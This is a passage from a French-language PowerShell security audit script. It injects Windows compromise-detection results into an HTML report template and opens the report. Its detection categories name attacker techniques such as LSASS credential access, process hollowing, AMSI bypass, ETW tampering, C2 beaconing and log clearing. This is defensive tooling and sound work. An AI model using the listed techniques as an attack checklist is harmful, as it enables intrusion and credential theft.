$ifeoContent      = js-arr $ifeoItems   { param($it) "{exe:$(js-str $it.Exe),debugger:$(js-str $it.Debugger)}" }
$comContent       = js-arr $comHijacks  { param($c) "{clsid:$(js-str $c.CLSID),path:$(js-str $c.Path)}" }
$lsaContent       = js-arr $lsaAlerts   { param($l) js-str $l }
$winlogonContent  = js-arr $winlogonAlerts { param($w) js-str $w }
$hollowContent    = js-arr $hollowedProcs { param($p) "{name:$(js-str $p.Name),pid:$($p.PID)}" }
$rwxContent       = js-arr $rwxProcs    { param($p) "{name:$(js-str $p.Name),pid:$($p.PID)}" }
$etwContent       = js-arr $etwTampered { param($p) "{name:$(js-str $p.Name),pid:$($p.PID)}" }
$sedbgContent     = js-arr $seDebugProcs { param($p) "{name:$(js-str $p.Name),pid:$($p.PID),path:$(js-str (if($p.Path){$p.Path}else{''}))}" }
$tokenContent     = js-arr $tokenAnomalies { param($p) "{name:$(js-str $p.Name),pid:$($p.PID),level:$(js-str $p.Level)}" }
$driverContent    = js-arr $suspDrivers { param($d) "{name:$(js-str $d.Name),path:$(js-str $d.Path),status:$(js-str $d.Status)}" }
$dllHijackContent = js-arr $dllHijacks  { param($d) "{dll:$(js-str $d.DLL),path:$(js-str $d.Path),pathDir:$(js-str $d.PathDir)}" }
$unquotedContent  = js-arr $unquotedPaths { param($u) "{name:$(js-str $u.Name),display:$(js-str $u.Display),path:$(js-str $u.Path)}" }
$suspSvcContent   = js-arr $suspServices { param($s) "{name:$(js-str $s.Name),display:$(js-str $s.Display),path:$(js-str $s.Path)}" }
$dnsContent2      = js-arr $dnsSuspicious { param($d) "{name:$(js-str $d.Name),ip:$(js-str $d.IP),note:$(js-str $d.Note)}" }
$dgaContent       = js-arr $dgaDomains   { param($d) "{domain:$(js-str $d.Domain),label:$(js-str $d.Label),entropy:$($d.Entropy),ip:$(js-str $d.IP)}" }
$proxyContent     = if ($proxyConfig) { "{server:$(js-str $proxyConfig.Server),override:$(js-str (if($proxyConfig.Override){$proxyConfig.Override}else{''}))}" } else { 'null' }
$beaconContent    = js-arr $beaconCandidates { param($b) "{ip:$(js-str $b.IP),port:$($b.Port),proc:$(js-str $b.Proc)}" }
$bpContent        = js-arr $bulletproofConns { param($b) "{ip:$(js-str $b.IP),proc:$(js-str $b.Proc),asn:$(js-str $b.ASN)}" }
$torContent       = js-arr $torConns     { param($t) "{ip:$(js-str $t.IP),proc:$(js-str $t.Proc)}" }
$scanContent      = js-arr $portScanners { param($s) "{process:$(js-str $s.Process),pid:$($s.PID),uniqueTargetPorts:$($s.UniqueTargetPorts)}" }
$credContent      = js-arr $credAccessors { param($a) "{caller:$(js-str $a.Caller),time:$(js-str $a.Time)}" }
$ticketContent    = js-arr $suspTickets  { param($t) "{server:$(js-str $t.Server),expires:$(js-str $t.Expires),issue:$(js-str $t.Issue)}" }
$clipContent      = if ($clipboardHijacker) { "{process:$(js-str $clipboardHijacker.Process),pid:$($clipboardHijacker.PID)}" } else { 'null' }
$credAccContent   = js-arr $credStoreAccess { param($c) "{browser:$(js-str $c.Browser),accessor:$(js-str $c.Accessor),time:$(js-str $c.Time)}" }
$dblExtContent    = js-arr $doubleExtFiles { param($f) "{name:$(js-str $f.Name),path:$(js-str $f.Path)}" }
$peWrongContent   = js-arr $peInWrongDir { param($f) "{name:$(js-str $f.Name),path:$(js-str $f.Path)}" }
$tsContent        = js-arr $timestomped  { param($f) "{name:$(js-str $f.Name),path:$(js-str $f.Path),created:$(js-str $f.Created),written:$(js-str $f.Written)}" }
$entropyContent   = js-arr $highEntropyPE { param($f) "{name:$(js-str $f.Name),path:$(js-str $f.Path),entropy:$($f.Entropy)}" }
$prefetchContent2 = js-arr $suspPrefetch { param($p) "{file:$(js-str $p.File),lastRun:$(js-str $p.LastRun)}" }
$lnkContent       = js-arr $suspLnk     { param($l) "{file:$(js-str $l.File),target:$(js-str $l.Target),args:$(js-str $l.Args)}" }
$bamContent       = js-arr $bamEntries  { param($e) "{path:$(js-str $e.Path),sid:$(js-str $e.SID)}" }
$shimContent2     = js-arr $shimSuspect  { param($s) js-str $s }
$amcacheContent   = js-arr $amcacheSuspect { param($s) js-str $s }
$jlContent        = js-arr $suspJumpLists { param($j) "{file:$(js-str $j.File),hit:$(js-str $j.Hit)}" }
$profileContent   = js-arr $suspProfiles { param($p) js-str $p }
$vmContent        = js-arr $vmArtifacts  { param($v) js-str $v }
$fwContent        = js-arr $fwDisabled   { param($f) js-str $f }
$auditContent     = js-arr $auditMissing { param($a) js-str $a }
$defContent       = if ($defenderStatus) {
    "{realTimeEnabled:$(js-bool $defenderStatus.RealTimeEnabled),amServiceEnabled:$(js-bool $defenderStatus.AMServiceEnabled),antivirusEnabled:$(js-bool $defenderStatus.AntivirusEnabled),behaviorMonitor:$(js-bool $defenderStatus.BehaviorMonitor),tamperProtection:$(js-bool $defenderStatus.TamperProtection)}"
} else { 'null' }
$defExclContent   = js-arr $defenderExclusions { param($e) js-str $e }
$uacContent       = if ($uacLevel) { "{enableLUA:$($uacLevel.EnableLUA),consentPrompt:$($uacLevel.ConsentPrompt)}" } else { 'null' }
$acctContent      = js-arr $suspAccounts { param($a) "{name:$(js-str $a.Name),issue:$(js-str $a.Issue)}" }
$shareContent     = js-arr $suspShares   { param($s) "{name:$(js-str $s.Name),path:$(js-str (if($s.Path){$s.Path}else{''})),desc:$(js-str (if($s.Description){$s.Description}else{''}))}" }
$newSvcContent    = js-arr $newServiceEvents { param($s) "{name:$(js-str $s.Name),imgPath:$(js-str $s.ImgPath),time:$(js-str $s.Time)}" }
$sbContent        = js-arr $suspScriptblocks { param($s) js-str $s }
$pe4688Content    = js-arr $suspProcEvents   { param($s) js-str $s }
$adsContent       = js-arr $adsFound         { param($a) "{file:$(js-str $a.File),streams:$(js-str $a.Streams)}" }

# ── Injection dans template ───────────────────────────────────────────────────
$html = Expand-Template

$html = $html -replace 'const SCORE = \d+',                       "const SCORE = $score"
$html = $html -replace '(?s)const ALERTS = \[.*?\];',             "const ALERTS = [`n$(esc-repl $alertsContent)`n];"
$html = $html -replace '(?s)const NETWORK = \[.*?\];',            "const NETWORK = [`n$networkContent`n];"
$html = $html -replace '(?s)const PORTS = \[.*?\];',              "const PORTS = [`n$portsContent`n];"
$html = $html -replace '(?s)const DISKS = \[.*?\];',              "const DISKS = [`n$disksContent`n];"
$html = $html -replace '(?s)const DRIVES_HEALTH = \[.*?\];',      "const DRIVES_HEALTH = [`n$drivesContent`n];"
$html = $html -replace '(?s)const PROCS_SUSPECTS = \[.*?\];',     "const PROCS_SUSPECTS = [`n$procsContent`n];"
$html = $html -replace "(?s)const sysinfo = \[.*?\];",            "const sysinfo = [`n    $sysinfoContent`n  ];"
$html = $html -replace '(?s)const PERSIST_ITEMS = \[.*?\];',      "const PERSIST_ITEMS = $persistContent;"
$html = $html -replace '(?s)const SUSP_TASKS = \[.*?\];',         "const SUSP_TASKS = $suspTasksContent;"
$html = $html -replace 'const WMI_SUB_COUNT = \d+',               "const WMI_SUB_COUNT = $wmiSubCount"
$html = $html -replace '(?s)const STARTUP_ITEMS = \[.*?\];',      "const STARTUP_ITEMS = $startupContent;"
$html = $html -replace '(?s)const HOSTS_ANOMALIES = \[.*?\];',    "const HOSTS_ANOMALIES = $hostsContent2;"
$html = $html -replace '(?s)const IFEO_ITEMS = \[.*?\];',         "const IFEO_ITEMS = $ifeoContent;"
$html = $html -replace "const APPINIT_DLLS = '';",                 "const APPINIT_DLLS = $(js-str (if($appInitDlls){$appInitDlls}else{''}));"
$html = $html -replace '(?s)const WINLOGON_ALERTS = \[.*?\];',    "const WINLOGON_ALERTS = $winlogonContent;"
$html = $html -replace '(?s)const COM_HIJACKS = \[.*?\];',        "const COM_HIJACKS = $comContent;"
$html = $html -replace '(?s)const LSA_ALERTS = \[.*?\];',         "const LSA_ALERTS = $lsaContent;"
$html = $html -replace 'const WDIGEST_ENABLED = \w+',             "const WDIGEST_ENABLED = $(js-bool $wdigestEnabled)"
$html = $html -replace 'const CRED_GUARD = \w+',                  "const CRED_GUARD = $(js-bool $credGuardEnabled)"
$html = $html -replace '(?s)const HOLLOW_PROCS = \[.*?\];',       "const HOLLOW_PROCS = $hollowContent;"
$html = $html -replace '(?s)const RWX_PROCS = \[.*?\];',          "const RWX_PROCS = $rwxContent;"
$html = $html -replace '(?s)const ETW_TAMPERED = \[.*?\];',       "const ETW_TAMPERED = $etwContent;"
$html = $html -replace '(?s)const SEDEBUG_PROCS = \[.*?\];',      "const SEDEBUG_PROCS = $sedbgContent;"
$html = $html -replace '(?s)const TOKEN_ANOMALIES = \[.*?\];',    "const TOKEN_ANOMALIES = $tokenContent;"
$html = $html -replace '(?s)const SUSP_DRIVERS = \[.*?\];',       "const SUSP_DRIVERS = $driverContent;"
$html = $html -replace '(?s)const DLL_HIJACKS = \[.*?\];',        "const DLL_HIJACKS = $dllHijackContent;"
$html = $html -replace '(?s)const UNQUOTED_PATHS = \[.*?\];',     "const UNQUOTED_PATHS = $unquotedContent;"
$html = $html -replace '(?s)const SUSP_SERVICES = \[.*?\];',      "const SUSP_SERVICES = $suspSvcContent;"
$html = $html -replace '(?s)const DNS_SUSPICIOUS = \[.*?\];',     "const DNS_SUSPICIOUS = $dnsContent2;"
$html = $html -replace '(?s)const DGA_DOMAINS = \[.*?\];',        "const DGA_DOMAINS = $dgaContent;"
$html = $html -replace 'const PROXY_CONFIG = \w+;',               "const PROXY_CONFIG = $proxyContent;"
$html = $html -replace '(?s)const BEACON_CANDIDATES = \[.*?\];',  "const BEACON_CANDIDATES = $beaconContent;"
$html = $html -replace '(?s)const BULLETPROOF_CONNS = \[.*?\];',  "const BULLETPROOF_CONNS = $bpContent;"
$html = $html -replace '(?s)const TOR_CONNS = \[.*?\];',          "const TOR_CONNS = $torContent;"
$html = $html -replace '(?s)const PORT_SCANNERS = \[.*?\];',      "const PORT_SCANNERS = $scanContent;"
$html = $html -replace ('(?s)const LSASS' + '_ACCESSORS = \[.*?\];'), ('const LSASS' + "_ACCESSORS = $credContent;")
$html = $html -replace '(?s)const SUSP_TICKETS = \[.*?\];',       "const SUSP_TICKETS = $ticketContent;"
$html = $html -replace 'const CLIPBOARD_HIJACKER = \w+;',         "const CLIPBOARD_HIJACKER = $clipContent;"
$html = $html -replace '(?s)const CRED_STORE_ACCESS = \[.*?\];',  "const CRED_STORE_ACCESS = $credAccContent;"
$html = $html -replace '(?s)const DOUBLE_EXT = \[.*?\];',         "const DOUBLE_EXT = $dblExtContent;"
$html = $html -replace '(?s)const PE_WRONG_DIR = \[.*?\];',       "const PE_WRONG_DIR = $peWrongContent;"
$html = $html -replace '(?s)const TIMESTOMPED = \[.*?\];',        "const TIMESTOMPED = $tsContent;"
$html = $html -replace '(?s)const HIGH_ENTROPY_PE = \[.*?\];',    "const HIGH_ENTROPY_PE = $entropyContent;"
$html = $html -replace '(?s)const SUSP_PREFETCH = \[.*?\];',      "const SUSP_PREFETCH = $prefetchContent2;"
$html = $html -replace '(?s)const SUSP_LNK = \[.*?\];',           "const SUSP_LNK = $lnkContent;"
$html = $html -replace '(?s)const BAM_ENTRIES = \[.*?\];',        "const BAM_ENTRIES = $bamContent;"
$html = $html -replace '(?s)const SHIM_SUSPECT = \[.*?\];',       "const SHIM_SUSPECT = $shimContent2;"
$html = $html -replace '(?s)const AMCACHE_SUSPECT = \[.*?\];',    "const AMCACHE_SUSPECT = $amcacheContent;"
$html = $html -replace '(?s)const SUSP_JUMPLISTS = \[.*?\];',     "const SUSP_JUMPLISTS = $jlContent;"
$html = $html -replace '(?s)const SUSP_PROFILES = \[.*?\];',      "const SUSP_PROFILES = $profileContent;"
$html = $html -replace 'const SHADOW_COUNT = \d+',                "const SHADOW_COUNT = $shadowCount"
$html = $html -replace '(?s)const VM_ARTIFACTS = \[.*?\];',       "const VM_ARTIFACTS = $vmContent;"
$html = $html -replace 'const SFC_CORRUPTED_COUNT = \d+',         "const SFC_CORRUPTED_COUNT = $($sfcCorrupted.Count)"
$html = $html -replace 'const HIDDEN_PROC_COUNT = \d+',           "const HIDDEN_PROC_COUNT = $hiddenProcCount"
$html = $html -replace 'const MBR_BOOTKIT = \w+',                 "const MBR_BOOTKIT = $(js-bool $mbrBootkit)"
$html = $html -replace 'const AMSI_BYPASS = \w+',                 "const AMSI_BYPASS = $(js-bool $amsiBypass)"
$html = $html -replace '(?s)const FW_DISABLED = \[.*?\];',        "const FW_DISABLED = $fwContent;"
$html = $html -replace '(?s)const AUDIT_MISSING = \[.*?\];',      "const AUDIT_MISSING = $auditContent;"
$html = $html -replace "const PS_CLM = '[^']*'",                  "const PS_CLM = '$(($psCLM -replace "'","''"))'"
$html = $html -replace 'const DEFENDER_STATUS = \w+;',            "const DEFENDER_STATUS = $defContent;"
$html = $html -replace '(?s)const DEFENDER_EXCL = \[.*?\];',      "const DEFENDER_EXCL = $defExclContent;"
$html = $html -replace 'const UAC_LEVEL = \w+;',                  "const UAC_LEVEL = $uacContent;"
$html = $html -replace '(?s)const SUSP_ACCOUNTS = \[.*?\];',      "const SUSP_ACCOUNTS = $acctContent;"
$html = $html -replace '(?s)const SMB_SHARES = \[.*?\];',         "const SMB_SHARES = $shareContent;"
$html = $html -replace 'const SMB_SESSION_COUNT = \d+',           "const SMB_SESSION_COUNT = $($smbSessions.Count)"
$html = $html -replace 'const LOG_CLEARED_COUNT = \d+',           "const LOG_CLEARED_COUNT = $logClearedCount"
$html = $html -replace '(?s)const NEW_SERVICE_EVENTS = \[.*?\];', "const NEW_SERVICE_EVENTS = $(esc-repl $newSvcContent);"
$html = $html -replace '(?s)const SUSP_SCRIPTBLOCKS = \[.*?\];',  "const SUSP_SCRIPTBLOCKS = $(esc-repl $sbContent);"
$html = $html -replace '(?s)const SUSP_PROC_EVENTS = \[.*?\];',   "const SUSP_PROC_EVENTS = $(esc-repl $pe4688Content);"
$html = $html -replace '(?s)const ADS_FOUND = \[.*?\];',          "const ADS_FOUND = $adsContent;"

# ── Écriture ──────────────────────────────────────────────────────────────────
$outDir  = $exeDir
$outFile = "rapport_securite_$(Get-Date -Format 'yyyy-MM-dd_HHmm').html"
$outPath = Join-Path $outDir $outFile
$utf8bom = New-Object System.Text.UTF8Encoding $true
[System.IO.File]::WriteAllText($outPath, $html, $utf8bom)

$nC = @($alerts|Where-Object{$_.Sev-eq'critique'}).Count
$nE = @($alerts|Where-Object{$_.Sev-eq'eleve'}).Count
$nM = @($alerts|Where-Object{$_.Sev-eq'moyen'}).Count
$nI = @($alerts|Where-Object{$_.Sev-eq'info'}).Count
${scoreCol} = if (${score} -ge 60) { "${ESC}[91m" } elseif (${score} -ge 30) { "${ESC}[93m" } else { "${ESC}[92m" }

Write-Host ""
Write-Host "${ESC}[96m  ╔═══════════════════════════════════════════════════╗${ESC}[0m"
Write-Host "${ESC}[96m  ║${ESC}[1;97m   RAPPORT GÉNÉRÉ                                   ${ESC}[0;96m║${ESC}[0m"
Write-Host "${ESC}[96m  ╠═══════════════════════════════════════════════════╣${ESC}[0m"
Write-Host "${ESC}[96m  ║${ESC}[0m  ${ESC}[90mFichier ${ESC}[97m${outPath}"
Write-Host "${ESC}[96m  ║${ESC}[0m  ${ESC}[90mScore   ${scoreCol}${score} / 100${ESC}[0m"
Write-Host "${ESC}[96m  ║${ESC}[0m  ${ESC}[90mAlertes ${ESC}[91m${nC} critiques  ${ESC}[93m${nE} élevées  ${ESC}[33m${nM} moyennes  ${ESC}[90m${nI} infos${ESC}[0m"
Write-Host "${ESC}[96m  ╚═══════════════════════════════════════════════════╝${ESC}[0m"
Write-Host ""
Write-Host "  ${ESC}[90mOuverture du rapport...${ESC}[0m"

Start-Process $outPath

